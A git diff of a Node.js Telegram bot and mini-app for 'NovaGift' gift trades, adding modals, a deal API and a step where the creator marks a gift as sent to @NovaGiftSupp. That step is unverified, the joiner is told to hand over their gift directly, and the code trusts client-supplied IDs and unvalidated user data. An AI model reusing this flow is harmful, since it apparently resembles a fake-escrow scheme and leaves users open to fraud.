@@ -1,23 +1,22 @@
 // index.js
-// Один файл: Express + HTML мини-аппка + Telegram-бот
+// Один файл: Express + мини-аппка + Telegram-бот
 
 const express = require('express');
 const { Telegraf } = require('telegraf');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const SUPPORT_CHAT_ID = process.env.SUPPORT_CHAT_ID; // id чата/канала поддержки
-const WEBAPP_URL = process.env.WEBAPP_URL; // например: https://nfttrade-production.up.railway.app
+const SUPPORT_CHAT_ID = process.env.SUPPORT_CHAT_ID;
+const WEBAPP_URL = process.env.WEBAPP_URL; // напр. https://novagift-production.up.railway.app
 
 if (!BOT_TOKEN) {
-  console.error('❌ Не задан BOT_TOKEN в переменных окружения');
+  console.error('❌ Не задан BOT_TOKEN');
   process.exit(1);
 }
-
 if (!WEBAPP_URL) {
-  console.warn('⚠ Не задан WEBAPP_URL. Укажи его в Railway Variables (например https://...up.railway.app)');
+  console.warn('⚠ Не задан WEBAPP_URL (например https://...up.railway.app)');
 }
 
-// ------------------- MINI-APP HTML (всё в одном) -------------------
+// ------------------- HTML мини-аппки -------------------
 
 const html = `<!DOCTYPE html>
 <html lang="ru">
@@ -194,6 +193,84 @@ const html = `<!DOCTYPE html>
       font-size: 13px;
       margin-top: 8px;
     }
+
+    /* Модалка */
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.7);
+      backdrop-filter: blur(6px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 50;
+    }
+
+    .modal {
+      width: 100%;
+      max-width: 420px;
+      background: radial-gradient(circle at top, #111827 0%, #020617 80%);
+      border-radius: 20px;
+      padding: 18px 16px 16px;
+      border: 1px solid rgba(148, 163, 184, 0.25);
+      box-shadow: 0 20px 60px rgba(15, 23, 42, 0.95);
+    }
+
+    .modal-title {
+      font-size: 17px;
+      font-weight: 600;
+      margin: 0 0 6px;
+    }
+
+    .modal-text {
+      font-size: 13px;
+      color: #e5e7eb;
+      margin: 0 0 10px;
+    }
+
+    .modal-sub {
+      font-size: 12px;
+      color: #9ca3af;
+      margin: 0 0 10px;
+    }
+
+    .modal-link-box {
+      background: rgba(15, 23, 42, 0.9);
+      border-radius: 12px;
+      border: 1px solid rgba(148, 163, 184, 0.35);
+      padding: 8px 10px;
+      font-size: 12px;
+      color: #e5e7eb;
+      word-break: break-all;
+      margin-bottom: 10px;
+    }
+
+    .modal-buttons {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .modal-btn {
+      flex: 1;
+      border: none;
+      border-radius: 999px;
+      height: 40px;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .modal-btn-primary {
+      background: linear-gradient(135deg, #f97316, #ec4899, #8b5cf6);
+      color: #fff;
+    }
+
+    .modal-btn-secondary {
+      background: rgba(15, 23, 42, 0.9);
+      color: #e5e7eb;
+      border: 1px solid rgba(148, 163, 184, 0.7);
+    }
   </style>
 </head>
 <body>
@@ -257,19 +334,34 @@ const html = `<!DOCTYPE html>
     </section>
   </div>
 
-  <!-- ВАЖНО: подключаем Telegram WebApp SDK -->
+  <!-- МОДАЛКА -->
+  <div id="modalBackdrop" class="modal-backdrop">
+    <div class="modal">
+      <h3 id="modalTitle" class="modal-title"></h3>
+      <p id="modalText" class="modal-text"></p>
+      <p id="modalSub" class="modal-sub" style="display:none;"></p>
+      <div id="modalLinkBox" class="modal-link-box" style="display:none;"></div>
+      <div class="modal-buttons">
+        <button id="modalSecondary" class="modal-btn modal-btn-secondary" style="display:none;">Отмена</button>
+        <button id="modalPrimary" class="modal-btn modal-btn-primary">Ок</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Telegram WebApp SDK -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
   <script>
-    // Проверяем, есть ли WebApp-окружение
     const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+    let initUser = null;
     if (tg) {
       tg.expand();
+      initUser = tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user : null;
       const envInfo = document.getElementById('envInfo');
       if (envInfo) envInfo.textContent = 'Открыто внутри Telegram WebApp ✔';
     } else {
       const envInfo = document.getElementById('envInfo');
-      if (envInfo) envInfo.textContent = 'Сейчас страница открыта как обычный сайт. Для работы открой её через бота в Telegram.';
+      if (envInfo) envInfo.textContent = 'Сейчас страница открыта как обычный сайт. Открой её через бота в Telegram.';
     }
 
     function getQueryParam(key) {
@@ -289,12 +381,59 @@ const html = `<!DOCTYPE html>
     if (mode === 'confirm' && dealIdFromUrl) {
       screenCreate.style.display = 'none';
       screenConfirm.style.display = 'block';
+      // Показать модалку "Начать сделку"
+      loadDealAndShowJoinModal(dealIdFromUrl);
     } else {
       screenCreate.style.display = 'block';
       screenConfirm.style.display = 'none';
     }
 
-    // Создание сделки
+    // ------------ Модалка ------------
+    const modalBackdrop = document.getElementById('modalBackdrop');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalText = document.getElementById('modalText');
+    const modalSub = document.getElementById('modalSub');
+    const modalLinkBox = document.getElementById('modalLinkBox');
+    const modalPrimary = document.getElementById('modalPrimary');
+    const modalSecondary = document.getElementById('modalSecondary');
+
+    function openModal(opts) {
+      modalTitle.textContent = opts.title || '';
+      modalText.textContent = opts.text || '';
+      if (opts.sub) {
+        modalSub.style.display = 'block';
+        modalSub.textContent = opts.sub;
+      } else {
+        modalSub.style.display = 'none';
+      }
+      if (opts.link) {
+        modalLinkBox.style.display = 'block';
+        modalLinkBox.textContent = opts.link;
+      } else {
+        modalLinkBox.style.display = 'none';
+      }
+      modalPrimary.textContent = opts.primaryText || 'Ок';
+      modalSecondary.style.display = opts.secondaryText ? 'inline-flex' : 'none';
+      if (opts.secondaryText) {
+        modalSecondary.textContent = opts.secondaryText;
+      }
+      modalBackdrop.style.display = 'flex';
+
+      modalPrimary.onclick = () => {
+        if (opts.onPrimary) opts.onPrimary();
+      };
+      modalSecondary.onclick = () => {
+        if (opts.onSecondary) opts.onSecondary();
+        closeModal();
+      };
+    }
+
+    function closeModal() {
+      modalBackdrop.style.display = 'none';
+    }
+
+    // ------------ Создание сделки ------------
+
     document.getElementById('btnCreate').addEventListener('click', () => {
       const otherUsername = document.getElementById('otherUsername').value.trim();
       const giftFromA = document.getElementById('giftFromA').value.trim();
@@ -307,32 +446,73 @@ const html = `<!DOCTYPE html>
         return;
       }
 
+      if (!tg) {
+        createStatus.style.display = 'block';
+        createStatus.style.color = '#f97316';
+        createStatus.textContent = 'Открой мини-приложение через бота в Telegram, тогда сделка создастся.';
+        return;
+      }
+
+      // Генерим dealId на фронте, чтобы знать ссылку
+      const dealId = 'deal_' + Date.now().toString(36);
+
       const payload = {
         type: 'CREATE_DEAL',
+        dealId,
         otherUsername,
         giftFromA,
         giftFromB
       };
 
-      if (!tg) {
-        createStatus.style.display = 'block';
-        createStatus.style.color = '#f97316';
-        createStatus.textContent = 'Открой мини-приложение через бота в Telegram (кнопка "Открыть NovaGift"), тогда сделка создастся.';
-        return;
-      }
-
       tg.sendData(JSON.stringify(payload));
       createStatus.style.display = 'block';
       createStatus.style.color = '#22c55e';
-      createStatus.textContent = 'Сделка отправлена боту, смотри сообщение в чате.';
-      setTimeout(() => tg.close(), 800);
+      createStatus.textContent = 'Сделка отправлена боту.';
+
+      const link = window.location.origin + '?dealId=' + encodeURIComponent(dealId) + '&mode=confirm';
+
+      // Модалка 1: ожидаем пользователя, отправь ссылку
+      openModal({
+        title: 'Сделка создана',
+        text: 'Отправь эту ссылку второму участнику, чтобы он присоединился к сделке.',
+        sub: 'После того как перекинешь ссылку, нажми «Продолжить».',
+        link,
+        primaryText: 'Продолжить',
+        onPrimary: () => {
+          // Модалка 2: отправь подарок на поддержку и скриншот
+          const otherTag = otherUsername.startsWith('@') ? otherUsername : '@' + otherUsername;
+          openModal({
+            title: 'Отправь подарок на поддержку',
+            text: 'Передай свой подарок на аккаунт @NovaGiftSupp.',
+            sub: 'Сделай скриншот передачи и отправь его пользователю ' + otherTag + ' в личные сообщения, затем нажми кнопку ниже.',
+            primaryText: 'Я отправил(а) подарок и скриншот',
+            onPrimary: () => {
+              // уведомляем бота, что создатель отправил на поддержку
+              const payload2 = {
+                type: 'CREATOR_SENT_TO_SUPPORT',
+                dealId
+              };
+              tg.sendData(JSON.stringify(payload2));
+              closeModal();
+              tg.close();
+            }
+          });
+        }
+      });
     });
 
-    // Подтверждение получения подарка
+    // ------------ Подтверждение получения подарка ------------
+
     document.getElementById('btnConfirm').addEventListener('click', () => {
       if (!dealIdFromUrl) {
         confirmWarning.style.display = 'block';
         confirmWarning.textContent = 'Не найден ID сделки в ссылке.';
+        return;
+      }
+
+      if (!tg) {
+        confirmWarning.style.display = 'block';
+        confirmWarning.textContent = 'Открой эту страницу через бота в Telegram, чтобы подтвердить сделку.';
         return;
       }
 
@@ -341,22 +521,48 @@ const html = `<!DOCTYPE html>
         dealId: dealIdFromUrl
       };
 
-      if (!tg) {
-        confirmWarning.style.display = 'block';
-        confirmWarning.textContent = 'Открой эту страницу через бота в Telegram (WebApp), тогда можно будет подтвердить сделку.';
-        return;
-      }
-
       tg.sendData(JSON.stringify(payload));
       confirmStatus.style.display = 'block';
       confirmStatus.textContent = 'Подтверждение отправлено. Бот всё сделает дальше.';
       setTimeout(() => tg.close(), 800);
     });
+
+    // ------------ Загрузка сделки для join-модалки ------------
+
+    async function loadDealAndShowJoinModal(dealId) {
+      try {
+        const res = await fetch('/api/deal/' + encodeURIComponent(dealId));
+        if (!res.ok) return;
+        const deal = await res.json();
+
+        const myTag = initUser && initUser.username ? '@' + initUser.username : 'вы';
+        const creatorTag = deal.creatorUsername ? '@' + deal.creatorUsername : 'создатель';
+        const otherTag = deal.otherUsername ? '@' + deal.otherUsername : 'второй участник';
+
+        const otherSide =
+          initUser && initUser.username &&
+          initUser.username.toLowerCase() === (deal.creatorUsername || '').toLowerCase()
+            ? otherTag
+            : creatorTag;
+
+        openModal({
+          title: 'Начать сделку',
+          text: myTag + ', ты присоединился к сделке с ' + otherSide + '.',
+          sub: myTag + ' должен(на) передать свой подарок пользователю ' + otherSide + ', сделать скриншот и отправить его в личку, когда придёт твой подарок.',
+          primaryText: 'Понятно, начинаем',
+          onPrimary: () => {
+            closeModal();
+          }
+        });
+      } catch (e) {
+        console.error(e);
+      }
+    }
   </script>
 </body>
 </html>`;
 
-// ------------------- EXPRESS СЕРВЕР -------------------
+// ------------------- Express сервер -------------------
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -365,20 +571,30 @@ app.get('/', (req, res) => {
   res.send(html);
 });
 
+// API для получения сделки по id (для фронта)
+const deals = new Map();
+app.get('/api/deal/:id', (req, res) => {
+  const deal = deals.get(req.params.id);
+  if (!deal) return res.status(404).json({ error: 'not_found' });
+  res.json({
+    id: deal.id,
+    creatorUsername: deal.creatorUsername,
+    otherUsername: deal.otherUsername,
+    status: deal.status
+  });
+});
+
 app.get('/health', (req, res) => {
   res.send('ok');
 });
 
 app.listen(PORT, () => {
-  console.log(`🌐 WebApp слушает порт ${PORT}`);
+  console.log('🌐 WebApp listening on', PORT);
 });
 
-// ------------------- TELEGRAM BOT -------------------
+// ------------------- Telegram бот -------------------
 
 const bot = new Telegraf(BOT_TOKEN);
-
-// простое хранилище сделок в памяти
-const deals = new Map();
 
 /**
  * deal:
@@ -389,7 +605,7 @@ const deals = new Map();
  *   otherUsername,
  *   giftFromA,
  *   giftFromB,
- *   status: 'CREATED' | 'COMPLETED',
+ *   status: 'CREATED' | 'A_SENT_TO_SUPPORT' | 'COMPLETED',
  *   createdAt
  * }
  */
@@ -423,14 +639,15 @@ bot.on('message', async (ctx) => {
   try {
     payload = JSON.parse(webAppData.data);
   } catch (e) {
-    console.error('Bad WebApp data', e);
+    console.error('Bad web_app_data', e);
     return;
   }
 
-  // Создание сделки
+  // --- Создание сделки ---
   if (payload.type === 'CREATE_DEAL') {
     const from = ctx.from;
-    const dealId = 'deal_' + Date.now().toString(36);
+    const incomingId = payload.dealId && String(payload.dealId);
+    const dealId = incomingId || ('deal_' + Date.now().toString(36));
 
     const deal = {
       id: dealId,
@@ -450,8 +667,7 @@ bot.on('message', async (ctx) => {
     await ctx.reply(
       '✅ Сделка создана.\n\n' +
       `ID сделки: ${dealId}\n\n` +
-      '1️⃣ Отправь свой подарок на @NovaGiftSupp.\n' +
-      '2️⃣ Отправь эту ссылку второму участнику, чтобы он подтвердил получение подарка:\n' +
+      'Отправь эту ссылку второму участнику, чтобы он присоединился:\n' +
       linkForOther
     );
 
@@ -459,15 +675,32 @@ bot.on('message', async (ctx) => {
       await ctx.telegram.sendMessage(
         SUPPORT_CHAT_ID,
         `Новая сделка ${deal.id}\n` +
-        `От: @${deal.creatorUsername}\n` +
-        `Второй участник: @${deal.otherUsername}\n` +
+        `Создатель: @${deal.creatorUsername}\n` +
+        `Второй участник (ожидается): @${deal.otherUsername}\n` +
         `Подарок от A: ${deal.giftFromA}\n` +
         `Подарок от B: ${deal.giftFromB}`
       );
     }
   }
 
-  // Подтверждение получения подарка
+  // --- Создатель отправил подарок на поддержку ---
+  if (payload.type === 'CREATOR_SENT_TO_SUPPORT') {
+    const deal = deals.get(payload.dealId);
+    if (!deal) return;
+
+    deal.status = 'A_SENT_TO_SUPPORT';
+
+    await ctx.reply('✅ Отметили, что ты отправил(а) подарок на @NovaGiftSupp.');
+
+    if (SUPPORT_CHAT_ID) {
+      await ctx.telegram.sendMessage(
+        SUPPORT_CHAT_ID,
+        `Создатель @${deal.creatorUsername} отметил, что отправил подарок по сделке ${deal.id} на @NovaGiftSupp.`
+      );
+    }
+  }
+
+  // --- Подтверждение получения подарка вторым участником ---
   if (payload.type === 'CONFIRM_RECEIVE') {
     const { dealId } = payload;
     const user = ctx.from;
@@ -486,7 +719,7 @@ bot.on('message', async (ctx) => {
     deal.status = 'COMPLETED';
 
     await ctx.reply(
-      '✅ Ты подтвердил, что подарок получен.\n' +
+      '✅ Ты подтвердил(а), что подарок получил(а).\n' +
       'Поддержка передаст второй подарок с аккаунта @NovaGiftSupp.'
     );
 
@@ -494,7 +727,7 @@ bot.on('message', async (ctx) => {
       try {
         await ctx.telegram.sendMessage(
           deal.creatorId,
-          `✅ Ваша сделка ${deal.id} подтверждена вторым участником.\n` +
+          `✅ Ваша сделка ${deal.id} подтверждена вторым участником (@${user.username || ('id' + user.id)}).\n` +
           'Поддержка отправит ваш подарок с @NovaGiftSupp.'
         );
       } catch (e) {
